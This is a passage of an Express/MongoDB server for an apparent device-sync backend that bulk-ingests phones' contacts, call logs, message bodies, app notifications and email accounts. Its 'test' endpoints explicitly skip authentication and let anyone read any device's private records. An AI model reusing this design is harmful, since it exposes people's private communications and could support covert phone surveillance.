// Load environment configuration
const config = require('./config/environment');

const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const crypto = require('crypto');

// Import database configuration
const connectDB = require('./config/database');

// Import models
const Device = require('./models/Device');
const Contact = require('./models/Contact');
const CallLog = require('./models/CallLog');
const Message = require('./models/Message');
const Notification = require('./models/Notification');
const EmailAccount = require('./models/EmailAccount');
const SyncSettings = require('./models/SyncSettings');

// Import routes
const deviceRoutes = require('./routes/devices');

const app = express();
const PORT = config.server.port;

// Connect to MongoDB using environment configuration
connectDB();

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// Mount routes
app.use('/api/devices', deviceRoutes);

// Helper function to get last sync time for a device and data type
async function getLastSyncTime(deviceId, dataType) {
    try {
        const lastSyncTime = await SyncSettings.getLastSyncTime(deviceId, dataType);
        return lastSyncTime;
    } catch (error) {
        console.error(`Error getting last sync time for ${deviceId}/${dataType}:`, error);
        return null;
    }
}

// Helper function to update last sync time for a device and data type
async function updateLastSyncTime(deviceId, dataType, lastSyncTime, itemCount = 0, status = 'SUCCESS', message = '') {
    try {
        await SyncSettings.updateLastSyncTime(deviceId, dataType, lastSyncTime, itemCount, status, message);
        console.log(`✅ Updated last sync time for ${deviceId}/${dataType}: ${lastSyncTime}`);
    } catch (error) {
        console.error(`Error updating last sync time for ${deviceId}/${dataType}:`, error);
    }
}

// Helper function to generate data hash for duplicate detection
function generateDataHash(deviceId, dataType, data) {
    const dataString = JSON.stringify(data);
    return crypto.createHash('md5').update(`${deviceId}-${dataType}-${dataString}`).digest('hex');
}

// Upload last 5 images endpoint - placed early to avoid conflicts
app.post('/api/test/devices/:deviceId/upload-last-5-images', async (req, res) => {
    try {
        const { deviceId } = req.params;
        
        console.log(`📸 Upload request for device: ${deviceId}`);
        console.log(`📁 Request body:`, req.body);
        
        return res.json({
            success: true,
            message: 'Upload endpoint reached successfully',
            deviceId: deviceId
        });
        
    } catch (error) {
        console.error('❌ Error uploading files:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to upload files',
            message: error.message
        });
    }
});

// Fix indexes endpoint
app.post('/api/fix-indexes', async (req, res) => {
    try {
        console.log('🔄 Manual index fix requested...');
        const db = mongoose.connection.db;
        
        // Fix Contacts collection
        const contactsCollection = db.collection('contacts');
        console.log('📞 Fixing contacts indexes...');
        try {
            await contactsCollection.dropIndexes();
            console.log('✅ Dropped existing contact indexes');
        } catch (error) {
            console.log('⚠️ No existing indexes to drop for contacts');
        }
        await contactsCollection.createIndex({ deviceId: 1, phoneNumber: 1 });
        await contactsCollection.createIndex({ dataHash: 1 }, { unique: true });
        console.log('✅ Created new contact indexes');

        // Fix Messages collection
        const messagesCollection = db.collection('messages');
        console.log('💬 Fixing messages indexes...');
        try {
            await messagesCollection.dropIndexes();
            console.log('✅ Dropped existing message indexes');
        } catch (error) {
            console.log('⚠️ No existing indexes to drop for messages');
        }
        await messagesCollection.createIndex({ deviceId: 1, address: 1, timestamp: 1, body: 1 });
        await messagesCollection.createIndex({ dataHash: 1 }, { unique: true });
        console.log('✅ Created new message indexes');

        // Fix CallLogs collection
        const callLogsCollection = db.collection('calllogs');
        console.log('📞 Fixing call logs indexes...');
        try {
            await callLogsCollection.dropIndexes();
            console.log('✅ Dropped existing call log indexes');
        } catch (error) {
            console.log('⚠️ No existing indexes to drop for call logs');
        }
        await callLogsCollection.createIndex({ deviceId: 1, phoneNumber: 1, timestamp: 1, duration: 1 });
        await callLogsCollection.createIndex({ dataHash: 1 }, { unique: true });
        console.log('✅ Created new call log indexes');

        console.log('🎉 All indexes fixed successfully!');
        
        res.json({
            success: true,
            message: 'Indexes fixed successfully'
        });
    } catch (error) {
        console.error('❌ Error fixing indexes:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fix indexes',
            message: error.message
        });
    }
});

// Health check endpoint
app.get('/api/health', async (req, res) => {
    try {
        const deviceCount = await Device.countDocuments();
        const contactCount = await Contact.countDocuments();
        const callLogCount = await CallLog.countDocuments();
        const messageCount = await Message.countDocuments();
        const notificationCount = await Notification.countDocuments();
        const emailCount = await EmailAccount.countDocuments();
        
        const totalSyncedRecords = contactCount + callLogCount + messageCount + notificationCount + emailCount;
        
        res.json({
            success: true,
            message: 'DeviceSync Backend Server is running with MongoDB',
            timestamp: new Date().toISOString(),
            database: 'MongoDB',
            stats: {
                devices: deviceCount,
                syncedRecords: totalSyncedRecords
            }
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Server error',
            error: error.message
        });
    }
});

// Device registration endpoint
app.post('/api/devices/register', async (req, res) => {
    try {
        console.log('📱 Device registration request body:', JSON.stringify(req.body, null, 2));
        
        // Handle both formats: { deviceId, deviceInfo } and direct DeviceInfo object
        let deviceId, deviceInfo;
        
        if (req.body.deviceId && req.body.deviceInfo) {
            // Format: { deviceId, deviceInfo }
            deviceId = req.body.deviceId;
            deviceInfo = req.body.deviceInfo;
        } else if (req.body.deviceId) {
            // Format: direct DeviceInfo object with deviceId field
            deviceId = req.body.deviceId;
            deviceInfo = req.body;
        } else {
            // Generate deviceId if not provided
            deviceId = `device_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            deviceInfo = req.body;
        }

        console.log(`📱 Processing device registration for ID: ${deviceId}`);

        let device = await Device.findOne({ deviceId: deviceId });

        if (!device) {
            // Create new device with default settings
            device = new Device({
                deviceId: deviceId,
                ...deviceInfo,
                registeredAt: new Date(),
                lastSeen: new Date()
            });
            await device.save();
            
            console.log(`✅ Device registered successfully: ${deviceId}`);
            return res.status(200).json({
                success: true,
                message: 'Device registered successfully',
                device,
                isNewDevice: true
            });
        } else {
            // Update existing device
            device.lastSeen = new Date();
            device.isActive = true;
            await device.save();

            console.log(`✅ Device found and updated: ${deviceId}`);
            return res.status(200).json({
                success: true,
                message: 'Device found',
                device,
                isNewDevice: false
            });
        }
    } catch (error) {
        console.error('❌ Device registration error:', error);
        res.status(200).json({ 
            success: false, 
            error: 'Internal server error',
            message: error.message 
        });
    }
});


// Upload last 5 images endpoint - placed early to avoid conflicts
app.post('/api/test/devices/:deviceId/upload-last-5-images', async (req, res) => {
    try {
        const { deviceId } = req.params;
        
        console.log(`📸 Upload request for device: ${deviceId}`);
        console.log(`📁 Request body:`, req.body);
        
        return res.json({
            success: true,
            message: 'Upload endpoint reached successfully',
            deviceId: deviceId
        });
        
    } catch (error) {
        console.error('❌ Error uploading files:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to upload files',
            message: error.message
        });
    }
});

// Core Sync Data Endpoint (NO AUTHENTICATION - For Testing) - BULK INSERT ONLY VERSION
app.post('/api/test/devices/:deviceId/sync', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { dataType, data, timestamp } = req.body;
        
        console.log(`🔓 TEST BULK INSERT: Processing ${dataType} for device ${deviceId}. Items: ${data.length}`);
        
        let Model, collectionName;
        
        // Determine which model to use based on data type
        switch (dataType) {
            case 'CONTACTS':
                Model = Contact.getModelForDevice(deviceId);
                collectionName = Contact.getCollectionName(deviceId);
                break;
            case 'CALL_LOGS':
                Model = CallLog.getModelForDevice(deviceId);
                collectionName = CallLog.getCollectionName(deviceId);
                break;
            case 'MESSAGES':
                Model = Message.getModelForDevice(deviceId);
                collectionName = Message.getCollectionName(deviceId);
                break;
            case 'NOTIFICATIONS':
                Model = Notification.getModelForDevice(deviceId);
                collectionName = Notification.getCollectionName(deviceId);
                break;
            case 'EMAIL_ACCOUNTS':
                Model = EmailAccount.getModelForDevice(deviceId);
                collectionName = EmailAccount.getCollectionName(deviceId);
                break;
            default:
                return res.status(400).json({
                    success: false,
                    error: `Unsupported data type: ${dataType}`
                });
        }
        
        // Get last sync time for this device and data type
        const lastSyncTime = await getLastSyncTime(deviceId, dataType);
        console.log(`📅 Last sync time for ${deviceId}/${dataType}: ${lastSyncTime || 'Never'}`);
        
        // STEP 1: Map and prepare all items
        const mappedItems = [];
        const dataHashes = new Set();
        
        for (const item of data) {
            try {
                let mappedItem = { ...item };
                
                switch (dataType) {
                    case 'CALL_LOGS':
                        const callType = (item.type || item.callType || '').toUpperCase();
                        const validCallTypes = ['INCOMING', 'OUTGOING', 'MISSED', 'REJECTED', 'BLOCKED'];
                        const mappedCallType = validCallTypes.includes(callType) ? callType : 'INCOMING';
                        
                        let callTimestamp;
                        try {
                            if (item.date) {
                                if (typeof item.date === 'string' && item.date.includes('T')) {
                                    callTimestamp = new Date(item.date);
                                } else {
                                    const dateValue = parseInt(item.date);
                                    if (!isNaN(dateValue) && dateValue > 0) {
                                        callTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
                                    } else {
                                        callTimestamp = new Date();
                                    }
                                }
                            } else if (item.timestamp) {
                                if (typeof item.timestamp === 'string' && item.timestamp.includes('T')) {
                                    callTimestamp = new Date(item.timestamp);
                                } else {
                                    const timestampValue = parseInt(item.timestamp);
                                    if (!isNaN(timestampValue) && timestampValue > 0) {
                                        callTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                    } else {
                                        callTimestamp = new Date();
                                    }
                                }
                            } else {
                                callTimestamp = new Date();
                            }
                            
                            if (isNaN(callTimestamp.getTime()) || callTimestamp.getTime() <= 0) {
                                callTimestamp = new Date();
                            }
                        } catch (error) {
                            callTimestamp = new Date();
                        }
                        
                        mappedItem = {
                            phoneNumber: item.phoneNumber || item.number || 'Unknown',
                            contactName: item.name || item.contactName || '',
                            callType: mappedCallType,
                            timestamp: callTimestamp,
                            duration: parseInt(item.duration) || 0,
                            deviceId: deviceId,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'CONTACTS':
                        const contactPhoneNumber = (item.phoneNumbers && item.phoneNumbers.length > 0) 
                            ? item.phoneNumbers[0] 
                            : (item.phoneNumber || '+0000000000');
                        
                        mappedItem = {
                            name: item.name || 'Unknown Contact',
                            phoneNumber: contactPhoneNumber,
                            phoneType: item.phoneType || 'MOBILE',
                            emails: item.emails || [],
                            organization: item.organization || item.company || '',
                            deviceId: deviceId,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'MESSAGES':
                        const messageType = (item.type || 'SMS').toUpperCase();
                        const validMessageTypes = ['SMS', 'MMS'];
                        const mappedMessageType = validMessageTypes.includes(messageType) ? messageType : 'SMS';
                        
                        let messageTimestamp;
                        try {
                            if (item.date) {
                                if (typeof item.date === 'string' && item.date.includes('T')) {
                                    messageTimestamp = new Date(item.date);
                                } else {
                                    const dateValue = parseInt(item.date);
                                    if (!isNaN(dateValue) && dateValue > 0) {
                                        messageTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
                                    } else {
                                        messageTimestamp = new Date();
                                    }
                                }
                            } else if (item.timestamp) {
                                if (typeof item.timestamp === 'string' && item.timestamp.includes('T')) {
                                    messageTimestamp = new Date(item.timestamp);
                                } else {
                                    const timestampValue = parseInt(item.timestamp);
                                    if (!isNaN(timestampValue) && timestampValue > 0) {
                                        messageTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                    } else {
                                        messageTimestamp = new Date();
                                    }
                                }
                            } else {
                                messageTimestamp = new Date();
                            }
                            
                            if (isNaN(messageTimestamp.getTime()) || messageTimestamp.getTime() <= 0) {
                                messageTimestamp = new Date();
                            }
                        } catch (error) {
                            messageTimestamp = new Date();
                        }
                        
                        mappedItem = {
                            address: item.address || item.phoneNumber || 'Unknown',
                            body: item.body || item.message || '',
                            type: mappedMessageType,
                            isIncoming: item.type === 'inbox' || item.isIncoming !== false,
                            timestamp: messageTimestamp,
                            isRead: item.read || item.isRead || false,
                            deviceId: deviceId,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'NOTIFICATIONS':
                        let notificationTimestamp;
                        try {
                            if (item.postTime) {
                                if (typeof item.postTime === 'string' && item.postTime.includes('T')) {
                                    notificationTimestamp = new Date(item.postTime);
                                } else {
                                    const postTimeValue = parseInt(item.postTime);
                                    if (!isNaN(postTimeValue) && postTimeValue > 0) {
                                        notificationTimestamp = new Date(postTimeValue > 1000000000000 ? postTimeValue : postTimeValue * 1000);
                                    } else {
                                        notificationTimestamp = new Date();
                                    }
                                }
                            } else if (item.timestamp) {
                                if (typeof item.timestamp === 'string' && item.timestamp.includes('T')) {
                                    notificationTimestamp = new Date(item.timestamp);
                                } else {
                                    const timestampValue = parseInt(item.timestamp);
                                    if (!isNaN(timestampValue) && timestampValue > 0) {
                                        notificationTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                    } else {
                                        notificationTimestamp = new Date();
                                    }
                                }
                            } else {
                                notificationTimestamp = new Date();
                            }
                            
                            if (isNaN(notificationTimestamp.getTime()) || notificationTimestamp.getTime() <= 0) {
                                notificationTimestamp = new Date();
                            }
                        } catch (error) {
                            notificationTimestamp = new Date();
                        }
                        
                        mappedItem = {
                            notificationId: item.notificationId || `notif_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            packageName: item.packageName || 'com.unknown.app',
                            appName: item.appName || item.packageName || 'Unknown App',
                            title: item.title || '',
                            text: item.text || item.body || '',
                            timestamp: notificationTimestamp,
                            deviceId: deviceId,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'EMAIL_ACCOUNTS':
                        mappedItem = {
                            accountId: item.accountId || `acc_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            emailAddress: item.emailAddress || item.email,
                            accountName: item.accountName || item.name || '',
                            provider: item.provider === 'gmail' ? 'Gmail' : 
                                    item.provider === 'outlook' ? 'Outlook' : 
                                    item.provider === 'yahoo' ? 'Yahoo' : 
                                    item.provider === 'icloud' ? 'iCloud' : 'Other',
                            accountType: item.accountType || 'IMAP',
                            isActive: item.isActive !== undefined ? item.isActive : true,
                            deviceId: deviceId,
                            syncedAt: new Date()
                        };
                        break;
                }
                
                // Generate data hash for duplicate detection
                const dataHash = generateDataHash(deviceId, dataType, mappedItem);
                mappedItem.dataHash = dataHash;
                
                // Check for duplicates within the current batch
                if (!dataHashes.has(dataHash)) {
                    dataHashes.add(dataHash);
                    mappedItems.push(mappedItem);
                } else {
                    console.log(`⚠️ Duplicate data hash found in batch for ${dataType}, skipping`);
                }
                
            } catch (itemError) {
                console.error(`❌ Error mapping ${dataType} item:`, itemError);
            }
        }
        
        console.log(`📊 Mapped ${mappedItems.length} unique items out of ${data.length} total items`);

        // STEP 2: Fetch existing data to filter out duplicates
        let existingData = [];
        try {
            const query = { deviceId: deviceId };
            
            // Add specific filters based on data type for better performance
            switch (dataType) {
                case 'CONTACTS':
                    const phoneNumbers = mappedItems.map(item => item.phoneNumber).filter(p => p);
                    if (phoneNumbers.length > 0) {
                        query.phoneNumber = { $in: phoneNumbers };
                    }
                    break;
                case 'CALL_LOGS':
                    const callLogKeys = mappedItems.map(item => ({
                        phoneNumber: item.phoneNumber,
                        timestamp: item.timestamp,
                        duration: item.duration
                    }));
                    if (callLogKeys.length > 0) {
                        query.$or = callLogKeys.map(key => ({
                            phoneNumber: key.phoneNumber,
                            timestamp: key.timestamp,
                            duration: key.duration
                        }));
                    }
                    break;
                case 'MESSAGES':
                    const messageKeys = mappedItems.map(item => ({
                        address: item.address,
                        timestamp: item.timestamp,
                        body: item.body
                    }));
                    if (messageKeys.length > 0) {
                        query.$or = messageKeys.map(key => ({
                            address: key.address,
                            timestamp: key.timestamp,
                            body: key.body
                        }));
                    }
                    break;
                case 'NOTIFICATIONS':
                    const notificationHashes = mappedItems.map(item => item.dataHash).filter(hash => hash);
                    if (notificationHashes.length > 0) {
                        query.dataHash = { $in: notificationHashes };
                    }
                    break;
                case 'EMAIL_ACCOUNTS':
                    const emailHashes = mappedItems.map(item => item.dataHash).filter(hash => hash);
                    if (emailHashes.length > 0) {
                        query.dataHash = { $in: emailHashes };
                    }
                    break;
            }
            
            existingData = await Model.find(query).lean();
            console.log(`🔍 Query used:`, JSON.stringify(query, null, 2));
            if (dataType === 'EMAIL_ACCOUNTS' || dataType === 'NOTIFICATIONS') {
                console.log(`🔍 Sample dataHash from mappedItems:`, mappedItems.slice(0, 3).map(item => item.dataHash));
            }
            console.log(`📋 Found ${existingData.length} existing records for ${dataType}`);
            
        } catch (error) {
            console.error(`❌ Error fetching existing data:`, error);
        }

        // STEP 3: Filter out items that already exist
        const newItems = [];
        
        for (const mappedItem of mappedItems) {
            let exists = false;
            
            // Check if item already exists
            for (const existing of existingData) {
                let match = false;
                
                switch (dataType) {
                    case 'CONTACTS':
                        match = existing.phoneNumber === mappedItem.phoneNumber;
                        break;
                    case 'CALL_LOGS':
                        match = existing.phoneNumber === mappedItem.phoneNumber &&
                                existing.timestamp.getTime() === mappedItem.timestamp.getTime() &&
                                existing.duration === mappedItem.duration;
                        break;
                    case 'MESSAGES':
                        match = existing.address === mappedItem.address &&
                                existing.timestamp.getTime() === mappedItem.timestamp.getTime() &&
                                existing.body === mappedItem.body;
                        break;
                    case 'NOTIFICATIONS':
                        match = existing.dataHash === mappedItem.dataHash;
                        break;
                    case 'EMAIL_ACCOUNTS':
                        match = existing.dataHash === mappedItem.dataHash;
                        break;
                }
                
                if (match) {
                    exists = true;
                    break;
                }
            }
            
            if (!exists) {
                newItems.push(mappedItem);
            }
        }
        
        console.log(`🆕 New items to insert: ${newItems.length}`);

        // STEP 4: Perform bulk insert only
        let insertedCount = 0;
        
        if (newItems.length > 0) {
            try {
                const insertResult = await Model.insertMany(newItems, { 
                    ordered: false, // Continue on errors
                    rawResult: true 
                });
                insertedCount = insertResult.insertedCount || newItems.length;
                console.log(`✅ Bulk inserted ${insertedCount} new ${dataType} items`);
            } catch (insertError) {
                console.error(`❌ Bulk insert error:`, insertError);
                // Fallback to individual inserts for failed items
                for (const item of newItems) {
                    try {
                        await Model.create(item);
                        insertedCount++;
                    } catch (error) {
                        console.error(`❌ Individual insert failed:`, error);
                    }
                }
            }
        }
        
        console.log(`🎉 TEST BULK INSERT COMPLETE: ${insertedCount} ${dataType} items inserted to ${collectionName}`);
        
        // Update last sync time
        const currentTime = new Date();
        await updateLastSyncTime(deviceId, dataType, currentTime, insertedCount, 'SUCCESS', `Bulk inserted ${insertedCount} items`);
        
        res.json({
            success: true,
            data: {
                success: true,
                itemsInserted: insertedCount,
                itemsSkipped: data.length - insertedCount,
                lastSyncTime: currentTime,
                message: `TEST BULK INSERT: ${insertedCount} items inserted successfully to ${collectionName}`
            }
        });
        
    } catch (error) {
        console.error('❌ Test bulk insert error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to sync data',
            message: error.message
        });
    }
});

// Get sync settings for a device
app.get('/api/test/devices/:deviceId/sync-settings', async (req, res) => {
    try {
        const { deviceId } = req.params;
        
        const settings = await SyncSettings.getDeviceSettings(deviceId);
        
        res.json({
            success: true,
            data: {
                deviceId,
                settings: settings
            }
        });
        
    } catch (error) {
        console.error('Error getting sync settings:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get sync settings'
        });
    }
});

// Get last sync time for a specific data type
app.get('/api/test/devices/:deviceId/last-sync/:dataType', async (req, res) => {
    try {
        const { deviceId, dataType } = req.params;
        
        const lastSyncTime = await getLastSyncTime(deviceId, dataType);
        
        res.json({
            success: true,
            data: {
                deviceId,
                dataType,
                lastSyncTime: lastSyncTime
            }
        });
        
    } catch (error) {
        console.error('Error getting last sync time:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get last sync time'
        });
    }
});

// Get synced data for a device
app.get('/api/test/devices/:deviceId/:dataType', async (req, res) => {
    try {
        const { deviceId, dataType } = req.params;
        const { page = 1, limit = 100, since } = req.query;
        
        let Model;
        
        // Determine which model to use based on data type
        switch (dataType) {
            case 'contacts':
                Model = Contact.getModelForDevice(deviceId);
                break;
            case 'call-logs':
                Model = CallLog.getModelForDevice(deviceId);
                break;
            case 'messages':
                Model = Message.getModelForDevice(deviceId);
                break;
            case 'notifications':
                Model = Notification.getModelForDevice(deviceId);
                break;
            case 'email-accounts':
                Model = EmailAccount.getModelForDevice(deviceId);
                break;
            default:
                return res.status(400).json({
                    success: false,
                    error: `Unsupported data type: ${dataType}`
                });
        }
        
        // Build query with optional since parameter
        let query = { deviceId };
        if (since) {
            const sinceDate = new Date(since);
            if (!isNaN(sinceDate.getTime())) {
                query.syncTime = { $gte: sinceDate };
            }
        }
        
        const data = await Model.find(query)
            .sort({ syncTime: -1 })
            .limit(limit * 1)
            .skip((page - 1) * limit);
        
        const total = await Model.countDocuments(query);
        
        res.json({
            success: true,
            data: {
                deviceId,
                dataType,
                items: data,
                pagination: {
                    current: page,
                    pages: Math.ceil(total / limit),
                    total
                }
            }
        });
        
    } catch (error) {
        console.error('Error getting data:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get data'
        });
    }
});

// ========================================
// LIVE DATA ENDPOINTS (Main Database)
// ========================================

// Live Sync Data Endpoint (Main Database) - BULK INSERT ONLY VERSION
app.post('/api/devices/:deviceId/sync', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { dataType, data, timestamp } = req.body;
        
        console.log(`🚀 BULK INSERT: Processing ${dataType} for device ${deviceId}. Items: ${data.length}`);
        
        let Model;
        
        // Determine which model to use based on data type (main collections)
        switch (dataType) {
            case 'CONTACTS':
                Model = Contact;
                break;
            case 'CALL_LOGS':
                Model = CallLog;
                break;
            case 'MESSAGES':
                Model = Message;
                break;
            case 'NOTIFICATIONS':
                Model = Notification;
                break;
            case 'EMAIL_ACCOUNTS':
                Model = EmailAccount;
                break;
            default:
                return res.status(400).json({
                    success: false,
                    error: `Unsupported data type: ${dataType}`
                });
        }

        // STEP 1: Map and prepare all items
        const mappedItems = [];
        const dataHashes = new Set();
        
        for (const item of data) {
            try {
                let mappedItem = { ...item };
                
                switch (dataType) {
                    case 'CALL_LOGS':
                        const callType = (item.type || item.callType || '').toUpperCase();
                        const validCallTypes = ['INCOMING', 'OUTGOING', 'MISSED', 'REJECTED', 'BLOCKED'];
                        const mappedCallType = validCallTypes.includes(callType) ? callType : 'INCOMING';
                        
                        let callTimestamp;
                        try {
                            if (item.date) {
                                if (typeof item.date === 'string' && item.date.includes('T')) {
                                    callTimestamp = new Date(item.date);
                                } else {
                                    const dateValue = parseInt(item.date);
                                    if (!isNaN(dateValue) && dateValue > 0) {
                                        callTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
                                    } else {
                                        callTimestamp = new Date();
                                    }
                                }
                            } else if (item.timestamp) {
                                if (typeof item.timestamp === 'string' && item.timestamp.includes('T')) {
                                    callTimestamp = new Date(item.timestamp);
                                } else {
                                    const timestampValue = parseInt(item.timestamp);
                                    if (!isNaN(timestampValue) && timestampValue > 0) {
                                        callTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                    } else {
                                        callTimestamp = new Date();
                                    }
                                }
                            } else {
                                callTimestamp = new Date();
                            }
                            
                            if (isNaN(callTimestamp.getTime()) || callTimestamp.getTime() <= 0) {
                                callTimestamp = new Date();
                            }
                        } catch (error) {
                            callTimestamp = new Date();
                        }
                        
                        mappedItem = {
                            phoneNumber: item.phoneNumber || item.number || 'Unknown',
                            contactName: item.name || item.contactName || '',
                            callType: mappedCallType,
                            timestamp: callTimestamp,
                            duration: parseInt(item.duration) || 0,
                            deviceId: deviceId,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'CONTACTS':
                        const contactPhoneNumber = (item.phoneNumbers && item.phoneNumbers.length > 0) 
                            ? item.phoneNumbers[0] 
                            : (item.phoneNumber || '+0000000000');
                        
                        mappedItem = {
                            name: item.name || 'Unknown',
                            phoneNumber: contactPhoneNumber,
                            phoneType: item.phoneType || 'MOBILE',
                            emails: item.emails || [],
                            organization: item.organization || '',
                            deviceId: deviceId,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'MESSAGES':
                        const messageType = (item.type || '').toUpperCase();
                        const validMessageTypes = ['SMS', 'MMS', 'WHATSAPP'];
                        const mappedMessageType = validMessageTypes.includes(messageType) ? messageType : 'SMS';
                        
                        let messageTimestamp;
                        try {
                            if (item.timestamp) {
                                if (typeof item.timestamp === 'string' && item.timestamp.includes('T')) {
                                    messageTimestamp = new Date(item.timestamp);
                                } else {
                                    const timestampValue = parseInt(item.timestamp);
                                    if (!isNaN(timestampValue) && timestampValue > 0) {
                                        messageTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                    } else {
                                        messageTimestamp = new Date();
                                    }
                                }
                            } else if (item.date) {
                                if (typeof item.date === 'string' && item.date.includes('T')) {
                                    messageTimestamp = new Date(item.date);
                                } else {
                                    const dateValue = parseInt(item.date);
                                    if (!isNaN(dateValue) && dateValue > 0) {
                                        messageTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
                                    } else {
                                        messageTimestamp = new Date();
                                    }
                                }
                            } else {
                                messageTimestamp = new Date();
                            }
                            
                            if (isNaN(messageTimestamp.getTime()) || messageTimestamp.getTime() <= 0) {
                                messageTimestamp = new Date();
                            }
                        } catch (error) {
                            messageTimestamp = new Date();
                        }
                        
                        mappedItem = {
                            address: item.address || item.phoneNumber || 'Unknown',
                            body: item.body || item.message || '',
                            type: mappedMessageType,
                            timestamp: messageTimestamp,
                            isIncoming: item.isIncoming || false,
                            isRead: item.isRead || true,
                            deviceId: deviceId,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'NOTIFICATIONS':
                        let notificationTimestamp;
                        try {
                            if (item.timestamp) {
                                if (typeof item.timestamp === 'string' && item.timestamp.includes('T')) {
                                    notificationTimestamp = new Date(item.timestamp);
                                } else {
                                    const timestampValue = parseInt(item.timestamp);
                                    if (!isNaN(timestampValue) && timestampValue > 0) {
                                        notificationTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                    } else {
                                        notificationTimestamp = new Date();
                                    }
                                }
                            } else if (item.postTime) {
                                if (typeof item.postTime === 'string' && item.postTime.includes('T')) {
                                    notificationTimestamp = new Date(item.postTime);
                                } else {
                                    const postTimeValue = parseInt(item.postTime);
                                    if (!isNaN(postTimeValue) && postTimeValue > 0) {
                                        notificationTimestamp = new Date(postTimeValue > 1000000000000 ? postTimeValue : postTimeValue * 1000);
                                    } else {
                                        notificationTimestamp = new Date();
                                    }
                                }
                            } else {
                                notificationTimestamp = new Date();
                            }
                            
                            if (isNaN(notificationTimestamp.getTime()) || notificationTimestamp.getTime() <= 0) {
                                notificationTimestamp = new Date();
                            }
                        } catch (error) {
                            notificationTimestamp = new Date();
                        }
                        
                        mappedItem = {
                            notificationId: item.notificationId || `notif_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            packageName: item.packageName || 'unknown',
                            appName: item.appName || 'Unknown App',
                            title: item.title || '',
                            text: item.text || '',
                            timestamp: notificationTimestamp,
                            deviceId: deviceId,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'EMAIL_ACCOUNTS':
                        const emailProvider = item.provider || 'Gmail';
                        const validProviders = ['Gmail', 'Outlook', 'Yahoo', 'iCloud', 'Other'];
                        const mappedProvider = validProviders.includes(emailProvider) ? emailProvider : 'Other';
                        
                        mappedItem = {
                            accountId: item.accountId || `acc_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            emailAddress: item.email || item.emailAddress || 'unknown@email.com',
                            accountName: item.name || item.accountName || 'Unknown Account',
                            provider: mappedProvider,
                            accountType: item.type || item.accountType || 'IMAP',
                            isActive: item.isActive !== undefined ? item.isActive : true,
                            deviceId: deviceId,
                            syncedAt: new Date()
                        };
                        break;
                }
                
                // Generate data hash for duplicate detection
                const dataHash = generateDataHash(deviceId, dataType, mappedItem);
                mappedItem.dataHash = dataHash;
                
                // Check for duplicates within the current batch
                if (!dataHashes.has(dataHash)) {
                    dataHashes.add(dataHash);
                    mappedItems.push(mappedItem);
                } else {
                    console.log(`⚠️ Duplicate data hash found in batch for ${dataType}, skipping`);
                }
                
            } catch (itemError) {
                console.error(`❌ Error mapping ${dataType} item:`, itemError);
            }
        }
        
        console.log(`📊 Mapped ${mappedItems.length} unique items out of ${data.length} total items`);

        // STEP 2: Fetch existing data to filter out duplicates
        let existingData = [];
        try {
            const query = { deviceId: deviceId };
            
            // Add specific filters based on data type for better performance
            switch (dataType) {
                case 'CONTACTS':
                    const phoneNumbers = mappedItems.map(item => item.phoneNumber).filter(p => p);
                    if (phoneNumbers.length > 0) {
                        query.phoneNumber = { $in: phoneNumbers };
                    }
                    break;
                case 'CALL_LOGS':
                    const callLogKeys = mappedItems.map(item => ({
                        phoneNumber: item.phoneNumber,
                        timestamp: item.timestamp,
                        duration: item.duration
                    }));
                    if (callLogKeys.length > 0) {
                        query.$or = callLogKeys.map(key => ({
                            phoneNumber: key.phoneNumber,
                            timestamp: key.timestamp,
                            duration: key.duration
                        }));
                    }
                    break;
                case 'MESSAGES':
                    const messageKeys = mappedItems.map(item => ({
                        address: item.address,
                        timestamp: item.timestamp,
                        body: item.body
                    }));
                    if (messageKeys.length > 0) {
                        query.$or = messageKeys.map(key => ({
                            address: key.address,
                            timestamp: key.timestamp,
                            body: key.body
                        }));
                    }
                    break;
                case 'NOTIFICATIONS':
                    const notificationHashes = mappedItems.map(item => item.dataHash).filter(hash => hash);
                    if (notificationHashes.length > 0) {
                        query.dataHash = { $in: notificationHashes };
                    }
                    break;
                case 'EMAIL_ACCOUNTS':
                    const emailHashes = mappedItems.map(item => item.dataHash).filter(hash => hash);
                    if (emailHashes.length > 0) {
                        query.dataHash = { $in: emailHashes };
                    }
                    break;
            }
            
            existingData = await Model.find(query).lean();
            console.log(`🔍 Query used:`, JSON.stringify(query, null, 2));
            if (dataType === 'EMAIL_ACCOUNTS' || dataType === 'NOTIFICATIONS') {
